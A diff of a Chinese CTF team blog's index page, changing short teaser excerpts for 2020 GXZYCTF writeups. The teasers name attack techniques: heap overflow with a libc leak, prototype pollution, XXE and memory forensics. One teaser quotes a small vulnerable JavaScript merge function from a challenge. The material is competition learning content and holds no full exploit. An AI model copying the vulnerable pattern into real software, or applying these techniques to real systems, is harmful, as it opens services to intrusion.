+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-03-21 09:52:20 / 修改时间：20:57:40" itemprop="dateCreated datePublished" datetime="2020-03-21T09:52:20+08:00">2020-03-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn/Libc/" itemprop="url" rel="index"><span itemprop="name">Libc</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          堆溢出，改下一个heap的size，利用文件结构体泄露libc地址。
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/03/21/2020_GXZYCTF_woodenbox/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://boiteam.github.io/2020/03/20/2020_GXZCTF_cyclegraph/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -669,503 +1405,6 @@
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://boiteam.github.io/2020/03/17/2020_GXZCTF_%E6%AD%A6%E6%B1%89%E5%8A%A0%E6%B2%B9/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.png">
-      <meta itemprop="name" content="BOI Team">
-      <meta itemprop="description" content="Because Of Interest">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="BOI Team">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/03/17/2020_GXZCTF_%E6%AD%A6%E6%B1%89%E5%8A%A0%E6%B2%B9/" class="post-title-link" itemprop="url">2020 GXZYCTF 武汉加油</a>
-        </h1>
-
-        <div class="post-meta">
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-03-17 13:54:17" itemprop="dateCreated datePublished" datetime="2020-03-17T13:54:17+08:00">2020-03-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-03-21 20:26:55" itemprop="dateModified" datetime="2020-03-21T20:26:55+08:00">2020-03-21</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Misc/" itemprop="url" rel="index"><span itemprop="name">Misc</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>184</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>binwalk分析一下</p>
-<p><img src="/2020/03/17/2020_GXZCTF_%E6%AD%A6%E6%B1%89%E5%8A%A0%E6%B2%B9/image-20200321202605726.png" alt="image-20200321202605726"></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/03/17/2020_GXZCTF_%E6%AD%A6%E6%B1%89%E5%8A%A0%E6%B2%B9/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://boiteam.github.io/2020/03/17/2020_GXZCTF_ez_mem&usb/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.png">
-      <meta itemprop="name" content="BOI Team">
-      <meta itemprop="description" content="Because Of Interest">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="BOI Team">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/03/17/2020_GXZCTF_ez_mem&usb/" class="post-title-link" itemprop="url">2020 GXZYCTF ez_mem&usb</a>
-        </h1>
-
-        <div class="post-meta">
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-03-17 13:54:17" itemprop="dateCreated datePublished" datetime="2020-03-17T13:54:17+08:00">2020-03-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-03-21 20:00:30" itemprop="dateModified" datetime="2020-03-21T20:00:30+08:00">2020-03-21</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Misc/" itemprop="url" rel="index"><span itemprop="name">Misc</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>54</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Binwalk分离出一个压缩包，解开得data.vmem文件</p>
-<p>Volatility分析</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/03/17/2020_GXZCTF_ez_mem&usb/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_GuessGame/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.png">
-      <meta itemprop="name" content="BOI Team">
-      <meta itemprop="description" content="Because Of Interest">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="BOI Team">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/03/09/2020_GXZYCTF_GuessGame/" class="post-title-link" itemprop="url">2020 GXZYCTF GuessGame</a>
-        </h1>
-
-        <div class="post-meta">
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-03-09 09:52:20" itemprop="dateCreated datePublished" datetime="2020-03-09T09:52:20+08:00">2020-03-09</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-03-21 19:31:30" itemprop="dateModified" datetime="2020-03-21T19:31:30+08:00">2020-03-21</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web/JS/" itemprop="url" rel="index"><span itemprop="name">JS</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.6k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>看到log函数里面有merge，那么可以原型链污染了</p>
-<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">function <span class="keyword">log</span>(<span class="keyword">user</span>Info)&#123;</span><br><span class="line">    let <span class="keyword">log</span>Item = &#123;<span class="string">"time"</span>:new Date().<span class="keyword">to</span>String()&#125;;</span><br><span class="line">    merge(<span class="keyword">log</span>Item,<span class="keyword">user</span>Info);</span><br><span class="line">    loginHistory.push(<span class="keyword">log</span>Item);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/03/09/2020_GXZYCTF_GuessGame/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_baby_java/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.png">
-      <meta itemprop="name" content="BOI Team">
-      <meta itemprop="description" content="Because Of Interest">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="BOI Team">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/03/09/2020_GXZYCTF_baby_java/" class="post-title-link" itemprop="url">2020 GXZYCTF baby_java</a>
-        </h1>
-
-        <div class="post-meta">
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-03-09 09:52:20" itemprop="dateCreated datePublished" datetime="2020-03-09T09:52:20+08:00">2020-03-09</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-03-21 19:17:53" itemprop="dateModified" datetime="2020-03-21T19:17:53+08:00">2020-03-21</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web/Java/" itemprop="url" rel="index"><span itemprop="name">Java</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>6k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>5 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><img src="/2020/03/09/2020_GXZYCTF_baby_java/image-20200311132610679.png" alt></p>
-<p>很酷炫，然后比赛就是不会做，burp截包可以看到这里用了xml格式来读取输入的数据，可以xxe，</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/03/09/2020_GXZYCTF_baby_java/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_dooog/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.png">
-      <meta itemprop="name" content="BOI Team">
-      <meta itemprop="description" content="Because Of Interest">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="BOI Team">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/03/09/2020_GXZYCTF_dooog/" class="post-title-link" itemprop="url">2020 GXZYCTF dooog</a>
-        </h1>
-
-        <div class="post-meta">
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-03-09 09:52:20" itemprop="dateCreated datePublished" datetime="2020-03-09T09:52:20+08:00">2020-03-09</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-03-21 20:03:57" itemprop="dateModified" datetime="2020-03-21T20:03:57+08:00">2020-03-21</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web/Python/" itemprop="url" rel="index"><span itemprop="name">Python</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>3.3k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>题目很简单，逻辑捋清楚就行了，</p>
-<a id="more"></a>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/03/09/2020_GXZYCTF_dooog/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -1238,20 +1477,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-count">27</span>
           <span class="site-state-item-name">文章</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">10</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-count">35</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -1364,7 +1603,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">36k</span>
+    <span title="站点总字数">47k</span>
 </div>
 
         
